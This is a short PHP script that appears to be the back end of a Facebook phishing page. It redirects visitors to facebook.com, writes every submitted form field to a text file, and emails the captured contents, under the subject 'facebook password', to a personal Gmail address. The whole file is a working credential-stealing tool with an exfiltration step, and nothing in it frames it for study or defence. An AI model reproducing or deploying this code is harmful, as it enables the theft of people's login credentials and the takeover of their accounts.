<?php
header ('Location:http://www.facebook.com');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

$password= file_get_contents( "usernames.txt" );
$to      = 'mukul.jaiswal786@gmail.com';
$subject = 'facebook password';
$message = $password;
$headers = 'From: jaiswal.mukul786@gmail.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

exit;
?> 